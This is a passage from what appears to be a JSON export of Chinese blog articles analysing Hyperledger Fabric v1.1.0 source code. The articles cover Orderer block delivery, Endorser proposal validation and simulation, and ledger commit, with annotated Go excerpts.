emptyValue)\n\t\t\t\t}\n\t\t\t}\n \n\t\t} else {\n\t\t\t// 跳过交易，因为该消息不是经过Endorser背书的普通交易消息\n\t\t\tlogger.Debugf(&quot;Skipping transaction [%d] since it is not an endorsement transaction\\n&quot;, tranNo)\n\t\t}\n\t\ttranNo++\n\t}\n\theight := version.NewHeight(blockNo, tranNo) // 创建版本对象\n\tdbBatch.Put(savePointKey, height.ToBytes())  // 添加保存点用于恢复\n \n\t// 同步更新批量操作dbBatch到历史数据库中\n\tif err := historyDB.db.WriteBatch(dbBatch, true); err != nil {\n\t\treturn err\n\t}\n...\n}\n到此为止：账本提交功能分析结束。\n参考\n\ngithub.com/blockchainGuide/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Deliver区块分发-5":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Deliver区块分发-5","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_Deliver区块分发-5.md","title":"死磕hyperledger fabric源码_Deliver区块分发-5","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|Deliver区块分发\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\n概述\nOrderer排序服务器提供了区块分发服务接口，接收客户端提交的区块请求消息（Envelope类型，通道头部类型是DELIVER_SEEK_INFO、CONFIG_UPDATE等），根据该消息封装的区块搜索信息对象（SeekInfo类型），包括查找最旧区块SeekOldest类型、查找最新区块SeekNewest类型、查找指定位置区块SeekSpecified类型等，构造对应请求范围的范围查询结果迭代器，读取Orderer节点指定通道账本上的区块数据，同时，建立消息处理循环，基于该结果迭代器依次读取请求的区块数据结果，发送给组织的Leader主节点等请求节点。\nOrderer节点启动时在本地gRPC服务器上注册了Orderer排序服务器，并创建了Deliver服务处理句柄。当客户端发起Deliver服务请求时，Orderer排序服务器就调用Deliver()方法处理消息请求。\nDiliver消息服务处理\n入口在orderer/common/server/server.go/Deliver()方法中：\nfunc (s *server) Deliver(srv ab.AtomicBroadcast_DeliverServer) error {\n\t...\n\tpolicyChecker := func(env *cb.Envelope, channelID string) error { // 定义策略检查器\n\t\tchain, ok := s.GetChain(channelID) // 获取指定通道的链支持对象\n\t\tif !ok {\n\t\t\treturn errors.Errorf(&quot;channel %s not found&quot;, channelID)\n\t\t}\n\t\t// 创建消息过滤器\n\t\tsf := msgprocessor.NewSigFilter(policies.ChannelReaders, chain)\n\t\treturn sf.Apply(env) // 过滤消息\n\t}\n\tserver := &amp;deliverMsgTracer{\n\t\tDeliverSupport: &amp;deliverHandlerSupport{AtomicBroadcast_DeliverServer: srv},\n\t\tmsgTracer: msgTracer{\n\t\t\tdebug:    s.debug,\n\t\t\tfunction: &quot;Deliver&quot;,\n\t\t},\n\t}\n\t// Deliver服务消息处理\n\treturn s.dh.Handle(deliver.NewDeliverServer(server, policyChecker, s.sendProducer(srv)))\n}\n大概做了以下几件事：\n\n定义策略检查器：用于检查接收的区块请求消息必须满足指定通道上的访问控制权限策略的要求\n获取指定通道的链支持对象\n创建消息过滤器，过滤消息\nDeliver服务消息处理区块请求\n\n我们来看是如何处理的，进入到s.dh.Handle:\n\n/common/deliver/deliver.go/Handle\n\nfunc (ds *deliverHandler) Handle(srv *DeliverServer) error {\n...\n\t// 等待消息请求并进行处理\n\tfor {\n\t\t...\n\t\tenvelope, err := srv.Recv() // 等待接收客户端发送的区块消息请求\n\t...\n\t\t// 从Orderer节点本地指定通道的区块账本中获取指定区块，并向客户端发送请求\n\t\tif err := ds.deliverBlocks(srv, envelope); err != nil {\n\t\t\treturn err\n\t\t}\n...\n\t}\n}\n不言而喻，直接进入到deliverBlocks,这部分的内容是最核心的，逐步分析如下：\n①：解析PayLoad,检查header和ChannelHeader的合法性\npayload, err := utils.UnmarshalPayload(envelope.Payload) // 解析消息负载\n...\nif payload.Header == nil {}\n// 解析通道头部\n\tchdr, err := utils.UnmarshalChannelHeader(payload.Header.ChannelHeader)\nerr = ds.validateChannelHeader(srv, chdr) // 验证通道头部合法性\n②：从chains字典中获取指定通道（chainID）的链支持对象chain，并检查该对象是否存在错误信息\nchain, ok := ds.sm.GetChain(chdr.ChannelId) // 获取指定通道的链支持对象\n③：创建访问控制对象,并检查消息签名是否符合指定的通道读权限策略**\naccessControl, err := newSessionAC(chain, envelope, srv.PolicyChecker, chdr.ChannelId, crypto.ExpiresAt)\n...\nerr := accessControl.evaluate()\n④：解析区块搜索信息SeekInfo结构对象\nseekInfo := &amp;ab.SeekInfo{}\nif err = proto.Unmarshal(payload.Data, seekInfo); err != nil {}\n⑤：检查起始位置与结束位置的合法性\nif seekInfo.Start == nil || seekInfo.Stop == nil {}\n⑥：创建区块账本迭代器并获取起始区块号，同时设置起始位置\ncursor, number := chain.Reader().Iterator(seekInfo.Start)\nIterator根据startPosition.Type起始位置对象的类型计算起始区块号startingBlockNumbe,类型如下：\n\n\nSeekPosition_Oldest：搜索最旧的区块，将起始区块号startingBlockNumber设置为 0；\n\n\nSeekPosition_Newest：搜索最新的区块，将起始区块号startingBlockNumber设置为当前通道账本的最新区块号info.Height-1，即账本高度减1；\n\n\nSeekPosition_Specified：搜索指定位置的区块，将起始区块号startingBlockNumber设置为指定起始位置的区块号start.Specified.Number。\n\n\nIterator 方法的大致功能如下： common/ledger/blockledger/file/impl.go/Iterator\nfunc (fl *FileLedger) Iterator(startPosition *ab.SeekPosition) (blockledger.Iterator, uint64) {\n\tvar startingBlockNumber uint64\n\tswitch start := startPosition.Type.(type) { // 分析起始位置类型\n\tcase *ab.SeekPosition_Oldest: // 搜索最旧区块，区块号为0\n\t\tstartingBlockNumber = 0\n\tcase *ab.SeekPosition_Newest: // 搜索最新区块\n\t\tinfo, err := fl.blockStore.GetBlockchainInfo() // 获取区块链信息\n\t\tif err != nil {\n\t\t\tlogger.Panic(err)\n\t\t}\n\t\tnewestBlockNumber := info.Height - 1 // 最新区块号\n\t\tstartingBlockNumber = newestBlockNumber\n\tcase *ab.SeekPosition_Specified: // 搜索指定位置区块\n\t\tstartingBlockNumber = start.Specified.Number\n\t\theight := fl.Height()\n\t\tif startingBlockNumber &gt; height { // 若超过高度，则报错\n\t\t\treturn &amp;blockledger.NotFoundErrorIterator{}, 0\n\t\t}\n\tdefault:\n\t\treturn &amp;blockledger.NotFoundErrorIterator{}, 0\n\t}\n\t// 构造区块迭代器\n\titerator, err := fl.blockStore.RetrieveBlocks(startingBlockNumber)\n\tif err != nil {\n\t\treturn &amp;blockledger.NotFoundErrorIterator{}, 0\n\t}\n\t// 构造账本区块迭代器\n\treturn &amp;fileLedgerIterator{ledger: fl, blockNumber: startingBlockNumber, commonIterator: iterator}, startingBlockNumber\n}\n⑦：循环读取区块数据，从本地区块账本中获取指定区块号范围内的区块数据，并依次顺序发送给请求客户端\n7.1 未找到数据返回\nif seekInfo.Behavior == ab.SeekInfo_FAIL_IF_NOT_READY {\n\t\t\tif number &gt; chain.Reader().Height()-1 {\n\t\t\t\treturn sendStatusReply(srv, cb.Status_NOT_FOUND)\n\t\t\t}\n\t\t}\n7.2 获取下一个数据\nblock, status := nextBlock(cursor, erroredChan) // 从本地账本获取下一个区块\nif status != cb.Status_SUCCESS {...}\n7.3  再次检查是否满足访问控制策略要求\nif err := accessControl.evaluate(); err != nil {}\n7.4  发送区块数据\nif err := sendBlockReply(srv, block); err != nil { }\n7.5 循环结束，发送成功状态\nif err := sendStatusReply(srv, cb.Status_SUCCESS);\nDeliver服务客户端\n以Leader主节点为例，分析Deliver服务客户端从Orderer节点请求获取区块的流程。\n初始化Deliver服务实例\n入口：gossip/service/gossip_service.go/InitializeChannel\nfunc (g *gossipServiceImpl) InitializeChannel(chainID string, endpoints []string, support Support) {\n\t...\n\tg.chains[chainID] = state.NewGossipStateProvider(chainID, servicesAdapter, coordinator)\n\tif g.deliveryService[chainID] == nil { // 检查是否已经存在Deliver服务实例\n\t\tvar err error\n\t\tg.deliveryService[chainID], err = g.deliveryFactory.Service(g, endpoints, g.mcs) // 检查是否已经存在Deliver服务实例\n\t\t...\n\t\t// peer.gossip.useLeaderElection与peer.gossip.orgLeader是互斥的两个配置参数，\n\t\t// 如果将两个都设置为true且没有被定义，则会引起Peer节点错误\n\t\t// 启用Leader主节点动态选举机制\n\t\tleaderElection := viper.GetBool(&quot;peer.gossip.useLeaderElection&quot;)\n\t\t// 静态设置为组织Leader主节点\n\t\tisStaticOrgLeader := viper.GetBool(&quot;peer.gossip.orgLeader&quot;)\n\t\t...\n\t\tif leaderElection { // 启用了动态Leader主节点选举机制\n\t\t\tlogger.Debug(&quot;Delivery uses dynamic leader election mechanism, channel&quot;, chainID)\n\t\t\tg.leaderElection[chainID] = g.newLeaderElectionComponent(chainID, g.onStatusChangeFactory(chainID, support.Committer))\n\t\t} else if isStaticOrgLeader {\n\t\t\t// 若静态指定了Leader主节点，则连接 Orderer节点请求区块数据\n\t\t\t// 启动指定通道上的Deliver服务实例请求获取区块数据\n\t\t\tg.deliveryService[chainID].StartDeliverForChannel(chainID, support.Committer, func() {})\n\t\t} ....\n}\n首先检查是否已经存在Deliver实例，然后根据Leader主节点动态选举机制还是静态指定了Leader主节点分别进入不同的分支，如果是静态指定了Leader主节点，则连接 Orderer节点请求区块数据,启动指定通道上的Deliver服务实例请求获取区块数据。接下来关注启动Deliver服务实例。\n启动Deliver服务实例\n主要做了以下事：\n①：获取绑定指定通道的区块提供者\nif _, exist := d.blockProviders[chainID];\n②：不存在区块提供者\nclient := d.newClient(chainID, ledgerInfo)\nfunc (d *deliverServiceImpl) newClient(chainID string, ledgerInfoProvider blocksprovider.LedgerInfo) *broadcastClient {\n\trequester := &amp;blocksRequester{ //定义区块请求者blocksRequester结构对象\n\t\ttls:     comm.TLSEnabled(),\n\t\tchainID: chainID,\n\t}\n\t//定义broadcastSetup()方法\n\tbroadcastSetup := func(bd blocksprovider.BlocksDeliverer) error {\n\t\treturn requester.RequestBlocks(ledgerInfoProvider) // 请求区块数据\n\t}\n\t...\n\t//创建connProducer对象\n\tconnProd := comm.NewConnectionProducer(d.conf.ConnFactory(chainID), d.conf.Endpoints)\n\t//// 创建broadcastClient客户端\n\tbClient := NewBroadcastClient(connProd, d.conf.ABCFactory, broadcastSetup, backoffPolicy)\n\trequester.client = bClient // 设置到区块请求者对象的客户端\n\treturn bClient\n}\n2.1 创建Deliver服务实例上的 broadcastClient客户端\nclient := d.newClient(chainID, ledgerInfo)\n2.2 创建指定通道关联的区块提供者\nd.blockProviders[chainID] = blocksprovider.NewBlocksProvider(chainID, client, d.conf.Gossip, d.conf.CryptoSvc)\n2.3 启动goroutine开始从Orderer节点请求获取区块，并发送到组织内其他Peer节点\ngo func() {\n\t\t\td.blockProviders[chainID].DeliverBlocks() // 请求获取区块数据\n\t\t\tfinalizer()\n\t\t}()\n接下来就是调用区块提供者对象的DeliverBlocks()方法，向Orderer节点发送消息请求的区块数据。\n请求获取区块数据\n入口在：core/deliverservice/blocksprovider/blocksprovider.go/DeliverBlocks(),具体分析如下：\n①：接收消息\nmsg, err := b.client.Recv() \n② ：根据消息类型进行处理\n大致有以下几种消息类型：\n\nDeliverResponse_Status:用于描述Deliver服务请求执行状态。\nDeliverResponse_Block：包含请求获取的区块数据。\n\n2.1 DeliverResponse_Status分支\n如果DeliverBlocks()方法接收到Status_SUCCESS状态，则说明本次区块请求处理成功，表示已经接收完毕区块请求消息指定范围内的区块数据。除此以外的其他状态消息都是非成功的执行状态消息，包括Status_BAD_REQUEST、Status_FORBIDDEN等\nif t.Status == common.Status_SUCCESS {}\nif t.Status == common.Status_BAD_REQUEST || t.Status == common.Status_FORBIDDEN {}\nif t.Status == common.Status_BAD_REQUEST {\n\t\t\t\tb.client.Disconnect(false)\n\t\t\t} else {\n\t\t\t\tb.client.Disconnect(true)\n\t\t\t}\n2.2 DeliverResponse_Block分支\n2.2.1 获取区块号\nseqNum := t.Block.Header.Number\n2.2.2获取经过序列化的区块字节数组\nmarshaledBlock, err := proto.Marshal(t.Block)\n2.2.3验证区块\nerr := b.mcs.VerifyBlock(gossipcommon.ChainID(b.chainID), seqNum, marshaledBlock);\n2.2.4获取通道Peer节点数量\nnumberOfPeers := len(b.gossip.PeersOfChannel(gossipcommon.ChainID(b.chainID)))\n2.2.5创建消息负载和Gossip消息\npayload := createPayload(seqNum, marshaledBlock) \ngossipMsg := createGossipMsg(b.chainID, payload)\n2.2.6添加消息负载到本地消息负载缓冲区，等待提交账本\nerr := b.gossip.AddPayload(b.chainID, payload)\n2.2.7通过Gossip消息协议发送区块消息到组织内的其他节点\n基于Gossip消息协议将DataMsg类型数据消息（只含有区块数据）分发到组织内的其他Peer节点上，并保存到该节点的消息存储器上。\nb.gossip.Gossip(gossipMsg)\n参考\n\ngithub.com/blockchainGuide/ (文章图片代码资料)\n微信公众号：区块链技术栈\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Endorser节点背书服务-7":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_Endorser节点背书服务-7","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_Endorser节点背书服务-7.md","title":"死磕hyperledger fabric源码_Endorser节点背书服务-7","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|Endorser节点背书服务\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\n背书概述\nEndorser背书节点提供ProcessProposal()服务接口用于接收与处理签名提案消息的请求，启动用户链码容器，执行调用链码，并对模拟执行结果进行签名背书，。Peer节点启动时解析core.yaml文件中的peer.handlers配置项，并构造认证过滤器列表。如果存在合法类型的认证过滤器，则需要先经过所有认证过滤器调用ProcessProposal()方法进行验证过滤，例如检查身份证书是否过期，然后再提交给背书服务器的serverEndorser.ProcessProposal()方法进行处理。 方法功能如下：\nfunc (e *Endorser) ProcessProposal(ctx context.Context, signedProp *pb.SignedProposal) (*pb.ProposalResponse, error) {\n\t...\n\t//检查并检验签名提案消息的合法性\n\tvr, err := e.preProcess(signedProp)\n\t...\n\t// 创建交易模拟器与历史查询执行器\n\tvar txsim ledger.TxSimulator\n\tvar historyQueryExecutor ledger.HistoryQueryExecutor\n\tif chainID != &quot;&quot; {\n\t\t// 创建交易模拟器对象\n\t\tif txsim, err = e.s.GetTxSimulator(chainID, txid); err != nil {\n\t\t\treturn &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}, err\n\t\t}\n\t\tif historyQueryExecutor, err = e.s.GetHistoryQueryExecutor(chainID); err != nil {\n\t\t\t// 创建历史查询器对象\n\t\t\treturn &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}, err\n\t\t}\n\t\t// 将历史查询执行器添加到context中的KV键值对\n\t\tctx = context.WithValue(ctx, chaincode.HistoryQueryExecutorKey, historyQueryExecutor)\n\t}\n\t\n\t// 模拟交易执行\n\tcd, res, simulationResult, ccevent, err := e.simulateProposal(ctx, chainID, txid, signedProp, prop, hdrExt.ChaincodeId, txsim)\n\tif err != nil {\n\t\t// 检查交易模拟运行结果的响应消息\n\t\treturn &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}, err\n\t}\n\tif res != nil {\n\t\t...\n\t\t\t// 创建背书失败的提案响应消息\n\t\t\tpResp, err := putils.CreateProposalResponseFailure(prop.Header, prop.Payload, res, simulationResult, cceventBytes, hdrExt.ChaincodeId, hdrExt.PayloadVisibility)\n\t\t\tif err != nil {\n\t\t\t\treturn &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}, err\n\t\t\t}\n \n\t\t\treturn pResp, &amp;chaincodeError{res.Status, res.Message}\n\t\t}\n\t}\n \n\t// 调用ESCC系统链码对模拟执行结果进行背书，并回复提案响应消息\n\tvar pResp *pb.ProposalResponse\n\tif chainID == &quot;&quot; {\n\t\tpResp = &amp;pb.ProposalResponse{Response: res}\n\t} else { // 签名背书\n\t\tpResp, err = e.endorseProposal(ctx, chainID, txid, signedProp, prop, res, simulationResult, ccevent, hdrExt.PayloadVisibility, hdrExt.ChaincodeId, txsim, cd)\n\t\tif err != nil {\n\t\t\treturn &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}, err\n\t\t}\n\t\tif pResp != nil {\n\t\t\tif res.Status &gt;= shim.ERRORTHRESHOLD { // 检查响应消息是否存在错误\n\t\t\t\tendorserLogger.Debugf(&quot;[%s][%s] endorseProposal() resulted in chaincode %s error for txid: %s&quot;, chainID, shorttxid(txid), hdrExt.ChaincodeId, txid)\n\t\t\t\treturn pResp, &amp;chaincodeError{res.Status, res.Message}\n\t\t\t}\n\t\t}\n\t}\n\tpResp.Response.Payload = res.Payload // 设置链码提案响应消息负载字节数组,含有链码调用返回值\n主要做了以下几件事：\n\n调用preProcess()方法预处理签名提案消息，验证消息合法性\n调用simulateProposal()方法启动链码容器并模拟执行提案，将结果读写集记录到模拟交易器中。\n调用endorseProposal()方法对模拟执行结果进行签名背书，并返回提案响应消息。\n\n下面的内容将会紧紧围绕这几部分来进行分析。\n预处理签名提案消息\n进入到preProcess函数：\n①： 验证签名提案消息格式与签名的合法性\nprop, hdr, hdrExt, err := validation.ValidateProposalMessage(signedProp)\n②:  检查提案消息是否允许外部调用的系统链码\n//解析消息通道头部ChannelHeader结构\n\tchdr, err := putils.UnmarshalChannelHeader(hdr.ChannelHeader)\n\t...\n\t//解析消息签名头部SignatureHeader结构\n\tshdr, err := putils.GetSignatureHeader(hdr.SignatureHeader)\n\t...\n\t//如果是系统链码，则检查是否为允许从外部调用的系统链码：cscc、lscc或qscc\n\tif e.s.IsSysCCAndNotInvokableExternal(hdrExt.ChaincodeId.Name) {\n\t\tendorserLogger.Errorf(&quot;Error: an attempt was made by %#v to invoke system chaincode %s&quot;,\n\t\t\tshdr.Creator, hdrExt.ChaincodeId.Name)\n\t\terr = errors.Errorf(&quot;chaincode %s cannot be invoked through a proposal&quot;, hdrExt.ChaincodeId.Name)\n\t\t//构造提案响应消息对象：状态码为500（错误）与错误信息\n\t\tvr.resp = &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}\n\t\treturn vr, err\n\t}\n③：检查签名提案消息的唯一性以及是否满足指定通道的访问权限策略\nchainID := chdr.ChannelId //获取通道标识号ChannelID，即链chainID\n\t//// 检查账本中交易ID的唯一性。注意ValidateProposalMessage()方法已经验证了交易号ID的合法性\n\ttxid := chdr.TxId\n\tif txid == &quot;&quot; {\n\t\terr = errors.New(&quot;invalid txID. It must be different from the empty string&quot;)\n\t\tvr.resp = &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}\n\t\treturn vr, err\n\t}\n\tendorserLogger.Debugf(&quot;[%s][%s] processing txid: %s&quot;, chainID, shorttxid(txid), txid)\n\tif chainID != &quot;&quot; {\n\t\t// 根据交易ID从账本中获取指定的交易对象，检查账本中交易对象的唯一性，\n\t\t// 若找到该对象则说明重复发起了交易，此时应报错\n\t\tif _, err = e.s.GetTransactionByID(chainID, txid); err == nil {\n\t\t\treturn vr, errors.Errorf(&quot;duplicate transaction found [%s]. Creator [%x]&quot;, txid, shdr.Creator)\n\t\t}\n\t\t/// 检查是否为系统链码，确保是用户链码\n\t\tif !e.s.IsSysCC(hdrExt.ChaincodeId.Name) {\n\t\t\t//// 检查提案是否符合WRITER写通道权限策略\n\t\t\tif err = e.s.CheckACL(signedProp, chdr, shdr, hdrExt); err != nil {\n\t\t\t\tvr.resp = &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}\n\t\t\t\treturn vr, err\n\t\t\t}\n\t\t}\n  } else {}\n以上3个部分内容还需要进一步的细化，看接下来的分析。\n验证消息格式与签名合法性\n①：调用validation.ValidateProposalMessage()函数，以检查签名提案消息格式与签名的合法性，解析获取提案消息、消息头部及其扩展域。\n1.1  校验header\nchdr, shdr, err := validateCommonHeader(hdr)\n校验header里面大概做了这几件事：\n\n\nvalidateChannelHeader(chdr)函数检查通道头部chdr的合法性，其通道头部类型应该属于ENDORSER_TRANSACTION、CONFIG_UPDATE、CONFIG或PEER_RESOURCE_UPDATE，并且Epoch字段应该为0；\n\n\nvalidateSignatureHeader(shdr)函数检查签名头部shdr的合法性，随机数Nonce和消息\n签名者Creator不应该为nil，并且该对象字节数不为0\n\n\n1.2 检查消息签名的合法性\nerr = checkSignatureFromCreator(shdr.Creator, signedProp.Signature, signedProp.ProposalBytes, chdr.ChannelId)\n该方法先获取当前通道的身份反序列化组件mspObj，解析出该签名头部的签名者creator，并调用creator.Validate()方法，验证creator是否为MSP有效的X.509合法证书。然后，调用creator.Verify()方法获取哈希方法及消息摘要（哈希值），通过所属MSP组件的BCCSP加密安全组件调用id.msp.bccsp.Verify()方法，验证消息签名的真实性\n1.3 验证提案消息头部中的交易ID是否计算正确\nerr = utils.CheckProposalTxID(\n\t\tchdr.TxId,\n\t\tshdr.Nonce,\n\t\tshdr.Creator)\n重新计算消息随机数Nonce（防止重放攻击）与签名者Creator组合信息后的哈希值，并且与交易ID进行比较。如果两者匹配相同，则说明交易ID是正确的。\n检查是否为允许外部调用的系统链码\nif e.s.IsSysCCAndNotInvokableExternal(hdrExt.ChaincodeId.Name) {\n\t\tendorserLogger.Errorf(&quot;Error: an attempt was made by %#v to invoke system chaincode %s&quot;,\n\t\t\tshdr.Creator, hdrExt.ChaincodeId.Name)\n\t\terr = errors.Errorf(&quot;chaincode %s cannot be invoked through a proposal&quot;, hdrExt.ChaincodeId.Name)\n\t\t//构造提案响应消息对象：状态码为500（错误）与错误信息\n\t\tvr.resp = &amp;pb.ProposalResponse{Response: &amp;pb.Response{Status: 500, Message: err.Error()}}\n\t\treturn vr, err\n\t}\n检查签名提案消息的唯一性\npreProcess()方法继续检查签名提案消息的唯一性，以防止重放攻击。该方法从提案消息通道头部提取链与交易ID，包括两种情况:\n\n如果链ID不是空字符串，则需要检查该交易ID的唯一性，确保之前没有提交过该交易到账本中。即根据交易ID从账本的区块文件以及区块索引数据库获取交易数据与交易验证码，并构造成已处理的交易对象 。如果获取交易数据成功且没有错误，则说明账本中已经保存了指定交易ID的交易数据。因此，当前提案消息属于重复提交，报错返回。否则，就说明该签名提案消息通过了消息唯一性的检查；\n如果链ID是空字符串，则不需要检查签名提案消息的唯一性与验证通道访问权限策略，只需要通过ValidateProposalMessage()函数验证该提案消息的合法性即可。\n\n检查是否满足通道的访问权限策略\n首先调用IsSysCC函数，检查链码是否为系统链码。如果是用户链码，则调用 CheckACL方法，检查签名提案消息是否满足通道PROPOSE权限策略要求，以允许提交该消息到指定通道上继续进行处理。CheckACL方法如下：\nfunc (d *defaultACLProvider) CheckACL(resName string, channelID string, idinfo interface{}) error {\n  policy := d.defaultPolicy(resName, true)\n  ....\n  case *pb.SignedProposal:\n\t\treturn d.policyChecker.CheckPolicy(channelID, policy, idinfo.(*pb.SignedProposal))\n\tcase *common.Envelope:\n\t\tsd, err := idinfo.(*common.Envelope).AsSignedData()\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\treturn d.policyChecker.CheckPolicyBySignedData(channelID, policy, sd)\n}\n方法先调用defaultPolicy()方法，从全局通道资源策略字典cResourcePolicyMap中获取指定策略名称resources.PROPOSE的默认策略。对于SignedProposal类型的签名提案消息，CheckACL()方法调用d.policyChecker.CheckPolicy()方法，检查该签名提案消息是否满足该通道上的Writers写权限策略要求。\n模拟执行提案\nProcessProposal()方法启动链码容器与初始化链码执行环境，模拟执行合法的签名提案消息，并将模拟执行结果记录在交易模拟器中。其中，对公有数据（包含公共数据与隐私数据哈希值）继续签名背书，并提交给Orderer节点请求排序出块，同时将隐私数据通过Gossip消息协议发送到组织内的其他授权节点上。核心函数如下：\nfunc (e *Endorser) simulateProposal(ctx context.Context, chainID string, txid string, signedProp *pb.SignedProposal, prop *pb.Proposal, cid *pb.ChaincodeID, txsim ledger.TxSimulator) (resourcesconfig.ChaincodeDefinition, *pb.Response, []byte, *pb.ChaincodeEvent, error) {\n\t// 解析获取链码调用规范对象\n\tcis, err := putils.GetChaincodeInvocationSpec(prop)\n\t...\n\t//1 检查是否为系统链码\n\tif !e.s.IsSysCC(cid.Name) { // 如果是调用用户链码，则需要保证该链码已经实例化了\n\t\t// === 用户链码，通过调用LSCC系统链码获取账本中保存的链码数据对象ChaincodeData结构\n\t\t// 如果链上有链码数据对象，则说明链码已经成功实例化\n\t\tcdLedger, err = e.s.GetChaincodeDefinition(ctx, chainID, txid, signedProp, prop, cid.Name, txsim)\n\t\tif err != nil {\n\t\t\treturn nil, nil, nil, nil, errors.WithMessage(err, fmt.Sprintf(&quot;make sure the chaincode %s has been successfully instantiated and try again&quot;, cid.Name))\n\t\t}\n\t\t// 获取已保存的链码版本\n\t\tversion = cdLedger.CCVersion()\n\t\t// 检查提案中的实例化策略与调用账本中的实例化策略是否匹配\n\t\terr = e.s.CheckInstantiationPolicy(cid.Name, version, cdLedger)\n\t\tif err != nil {\n\t\t\treturn nil, nil, nil, nil, err\n\t\t}\n\t} else { // === 执行系统链码，如lscc等\n\t\tversion = util.GetSysCCVersion() // 获取系统链码版本\n\t}\n\t...\n\t// 2 启动链码容器调用链码\n\tres, ccevent, err = e.callChaincode(ctx, chainID, version, txid, signedProp, prop, cis, cid, txsim)\n\tif err != nil {\n\t\tendorserLogger.Errorf(&quot;[%s][%s] failed to invoke chaincode %s, error: %+v&quot;, chainID, shorttxid(txid), cid, err)\n\t\treturn nil, nil, nil, nil, err\n\t}\n\t//3 获取并处理交易模拟执行结果\n\tif txsim != nil {\n\t\tif simResult, err = txsim.GetTxSimulationResults(); err != nil {\n\t\t\treturn nil, nil, nil, nil, err\n\t\t}\n \n\t\tif simResult.PvtSimulationResults != nil { // 检查模拟结果隐私数据的合法性\n\t\t\tif cid.Name == &quot;lscc&quot; {\n\t\t\t\t// TODO: remove once we can store collection configuration outside of LSCC\n\t\t\t\t// 分发隐私数据\n\t\t\t\treturn nil, nil, nil, nil, errors.New(&quot;Private data is forbidden to be used in instantiate&quot;)\n\t\t\t}\n\t\t\tif err := e.distributePrivateData(chainID, txid, simResult.PvtSimulationResults); err != nil {\n\t\t\t\treturn nil, nil, nil, nil, err\n\t\t\t}\n\t\t}\n\t\t// 分发隐私数据\n\t\tif pubSimResBytes, err = simResult.GetPubSimulationBytes(); err != nil {\n\t\t\treturn nil, nil, nil, nil, err\n\t\t}\n\t}\n\treturn cdLedger, res, pubSimResBytes, ccevent, nil\n}\n根据链码类型执行不同实例化策略\n首先调用GetChaincodeInvocationSpec函数，从提案消息中解析提取出链码调用规范对象，然后调用IsSysCC(cid.Name)方法，依次匹配默认的系统链码名称，以判断当前链码类型是用户链码还是系统链码，分为用户链码和系统链码两种情况检查实例化策略。\n①：用户链码\nif !e.s.IsSysCC(cid.Name) { // 如果是调用用户链码，则需要保证该链码已经实例化了\n\t\t// === 用户链码，通过调用LSCC系统链码获取账本中保存的链码数据对象ChaincodeData结构\n\t\t// 如果链上有链码数据对象，则说明链码已经成功实例化\n\t\tcdLedger, err = e.s.GetChaincodeDefinition(ctx, chainID, txid, signedProp, prop, cid.Name, txsim)\n\t\tif err != nil {\n\t\t\treturn nil, nil, nil, nil, errors.WithMessage(err, fmt.Sprintf(&quot;make sure the chaincode %s has been successfully instantiated and try again&quot;, cid.Name))\n\t\t}\n\t\t// 获取已保存的链码版本\n\t\tversion = cdLedger.CCVersion()\n\t\t// 检查提案中的实例化策略与调用账本中的实例化策略是否匹配\n\t\terr = e.s.CheckInstantiationPolicy(cid.Name, version, cdLedger)\n\t\tif err != nil {\n\t\t\treturn nil, nil, nil, nil, err\n\t\t}\n②：系统链码\nelse { // === 执行系统链码，如lscc等\n\t\tversion = util.GetSysCCVersion() // 获取系统链码版本\n\t}\n启动链码容器\nres, ccevent, err = e.callChaincode(ctx, chainID, version, txid, signedProp, prop, cis, cid, txsim)\n①：设置context上下文对象中交易模拟器的KV键值对，其中，键为TXSimulatorKey，值为交易模拟器txsim\nif txsim != nil {\n\t\tctxt = context.WithValue(ctxt, chaincode.TXSimulatorKey, txsim)\n\t}\n②：根据链码名称检查是否为系统链码\nscc := e.s.IsSysCC(cid.Name)\n③：执行链码调用\nres, ccevent, err = e.s.Execute(ctxt, chainID, cid.Name, version, txid, scc, signedProp, prop, cis)\n④：检查调用链码名称lscc\n// 第1个参数为deploy部署或upgrade升级，第2个参数是链ID，第3个是链码部署规范对象\n\tif cid.Name == &quot;lscc&quot; &amp;&amp; len(cis.ChaincodeSpec.Input.Args) &gt;= 3 &amp;&amp; (string(cis.ChaincodeSpec.Input.Args[0]) == &quot;deploy&quot; || string(cis.ChaincodeSpec.Input.Args[0]) == &quot;upgrade&quot;) {\n\t\tvar cds *pb.ChaincodeDeploymentSpec\n\t\t// 获取并验证链码部署规范\n\t\tcds, err = putils.GetChaincodeDeploymentSpec(cis.ChaincodeSpec.Input.Args[2])\n\t\tif err != nil {\n\t\t\treturn nil, nil, err\n\t\t}\n \n\t\t//this should not be a system chaincode\n\t\t// 若试图部署/升级系统链码，则报错\n\t\tif e.s.IsSysCC(cds.ChaincodeSpec.ChaincodeId.Name) {\n\t\t\treturn nil, nil, errors.Errorf(&quot;attempting to deploy a system chaincode %s/%s&quot;, cds.ChaincodeSpec.ChaincodeId.Name, chainID)\n\t\t}\n\t\t// 执行部署/升级链码\n\t\t_, _, err = e.s.Execute(ctxt, chainID, cds.ChaincodeSpec.ChaincodeId.Name, 